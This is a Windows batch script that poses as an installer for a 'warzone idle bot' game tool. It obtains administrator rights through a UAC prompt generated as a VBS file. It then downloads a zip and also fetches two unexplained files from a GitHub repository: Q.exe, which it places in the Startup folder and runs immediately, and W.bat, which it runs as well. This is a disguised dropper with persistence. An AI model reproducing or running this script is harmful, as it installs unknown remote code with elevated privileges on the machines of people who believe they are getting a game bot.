REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

cd %homepath%\desktop
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/warzone-idle-bot-master.zip -OutFile WZB.zip"
powershell "Expand-Archive -Force WZB.zip"
pause
del /f WZB.zip
cd %appdata%\TmpFiles
## powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe -Outfile PythonInstall.exe"
## Pythoninstall.exe
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
cd %appdata%\TmpFiles
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/W.bat -OutFile W.bat" && W.bat
exit
